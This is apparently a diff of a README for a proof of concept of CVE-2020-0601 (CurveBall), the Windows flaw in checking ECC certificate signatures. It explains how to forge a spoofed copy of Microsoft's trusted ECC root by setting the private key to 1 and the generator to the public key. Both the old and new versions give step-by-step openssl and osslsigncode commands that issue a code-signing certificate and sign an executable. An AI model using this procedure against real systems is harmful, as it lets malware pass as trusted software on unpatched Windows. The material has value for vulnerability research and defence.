@@ -1,35 +1,55 @@
-### CVE-2020-0601 - PoC
-Just a quick and small PoC CVE-2020-0601 for code signing PE files using a Certificate Authority using ECC.
-I've chosen not to include any CA file. You can create one yourself with the following command:
+# CurveBall (CVE-2020-0601) - PoC
+CVE-2020-0601, or commonly referred to as CurveBall, is a vulnerability in which the signature of certificates using elliptic curve cryptography (ECC) is not correctly verified. 
 
-    $ openssl ecparam -name secp384r1 -genkey > ca.key
-    $ openssl req -new -x509 -key ca.key -out ca.crt
-    
-Also note that not all CA's allow code signing. They have different purposes.
+ECC relies on different parameters. These parameters are standardized for many curves. However, Microsoft didn't check all these parameters. The parameter `G` (the generator) was not checked, and the attacker can therefore supply his own generator, such that when Microsoft tries to validate the certificate against a trusted CA, it'll only look for matching public keys, and then use then use the generator of the certificate. NSA explains the impact of this vulnerability and more [here](https://media.defense.gov/2020/Jan/14/2002234275/-1/-1/0/CSA-WINDOWS-10-CRYPT-LIB-20190114.PDF).
 
-The bug exploits `crypt32.dll` signature verification on elliptic curve. `crypt32.dll` only checks for matching public key and parameters, but not the generator `G`.
-The private key is `d = [1, n - 1]`, where `n` is order of the curve
-The public key is `Q` = `dG`.
-The generator `G` is defined for each curve, but the bug allows your to specify your own generator. 
+`MicrosoftECCProductRootCertificateAuthority.cer` is by default a trusted root certificate authority (CA) using ECC on Windows 10. Anything signed with this certificate will therefore automatically be trusted.  
+## Mathematical details
+If you're interested in the mathematical details of the vulnerability, please read more [here](https://news.ycombinator.com/item?id=22048619).
 
-We know the public key of an CA and the curve it uses. Thus, we can simply set `d' = 1` and `G' = Q`. 
+In order to spoof the certificate, we set the following parameters:
 
-Since `Q = d'G'`, we know have a valid private key, as long as we choose our own generator. A better explanation can be found [here](https://news.ycombinator.com/item?id=22048619).
+    d' = 1
+    G' = Q
+Such that `Q = Q' = d'G'`.
 
-The PoC assumes you have the certificate of the CA you wish to spoof. In the following example, the certificate uses NIST P-384 (secp384r1) curve, but this works for different curves as well.
+## Usage
+Create a certificate with the same public key and parameters of a trusted CA. This will be used as our spoofing CA. Set the generator to a value, where you know the private key. You can easily set the generator to the public key, and have a private key set to `1`, since `Q = dG`.
 
-    # forge a spoofing key, where d = 1, G = Q
-    $ ruby main.rb > fake.key 
-    # generate a spoofing certificate with the spoofing key
-    $ openssl req -new -x509 -key fake.key -out fake.crt 
-    # generate a key for your own certificate:
-    $ openssl ecparam -name secp384r1 -genkey > cert.key 
-    # request a certificate signing request for code signing:
-    $ openssl req -new -key cert.key -out cert.csr -config openssl.conf 
-    # sign the certificate request with our fake certificate and fake key
-    $ openssl x509 -req -days 365 -in cert.csr -CA fake.crt -CAkey fake.key -out cert.crt -CAcreateserial
-    # pack the certificate with its key and the fake certificate into a pkcs12 file
-    $ openssl pkcs12 -export -in cert.crt -inkey cert.key -certfile fake.crt -out cert.p12
-    # use osslsigncode (NIX) or signtool (Windows) to sign your desired PE exectuable
-    $ osslsigncode sign -pkcs12 ./cert.p12 -t http://timestamp.verisign.com/scripts/timstamp.dll -in 7z1900-x64.exe -out 7z1900-x64_signed.exe
-![Signed 7z](https://i.imgur.com/lQ9imcy.png)
+Next up, you create a certificate signing request with the extensions you wish to use, e.g. code signing or server authentication.
+
+Sign this certificate request with your spoofed CA and CA key, and add the usage extensions.
+
+Bundle the signed certificate request (now a regular certificate) with the spoofed CA, and you have a signed and trusted certificate. 
+
+When Windows checks whether the certificate is trusted, it'll see that it has been signed by our spoofed CA. It then looks at the spoofed CA's public key to check against trusted CA's. Then it simply verifies the signature of our spoofed CA with the spoofed CA's generator - this is the issue.
+
+If you choose to open your newly and signed, trusted certificate in Windows, it'll not recognize it as trusted, since it hasn't been tied to anything, thus it will not use the spoofed CA. The certificate must always present itself with the spoofed CA.
+
+## Code Signing
+*Please use this for educational and researching purposes only.* 
+
+Extract the public key from the CA and modify it according to the vulnerability:
+
+    ruby main.rb ./MicrosoftECCProductRootCertificateAuthority.cer
+Generate a new x509 certificate based on this key. This will be our own spoofed CA.
+
+    openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt
+Generate a new key. This key be of any type you want. It will be used to create a code signing certificate, which we will sign with our own CA.
+
+    openssl ecparam -name secp384r1 -genkey -noout -out cert.key
+Next up, create a new  certificate signing request (CSR). This request will oftenly be sent to trusted CA's, but since we have a spoofed one, we can sign it ourselves.
+
+    openssl req -new -key cert.key -out cert.csr -config openssl.conf -reqexts v3_cs
+Sign your new CSR with our spoofed CA and CA key. This certificate will expire in 2047, whereas the real trusted Microsoft CA will expire in 2043.
+
+    openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl.conf -extensions v3_cs
+The only thing left is to pack the certificate, its key and the spoofed CA into a PKCS12 file for signing executables.
+
+    openssl pkcs12 -export -in cert.crt -inkey cert.key -certfile spoofed_ca.crt -name "Code Signing" -out cert.p12
+Sign your executable with PKCS12 file.
+
+    osslsigncode sign -pkcs12 cert.p12 -n "Signed by ollypwn" -in 7z1900-x64.exe -out 7z1900-x64_signed.exe
+
+## SSL/TLS
+Coming soon. Same technique, different openssl parameters.
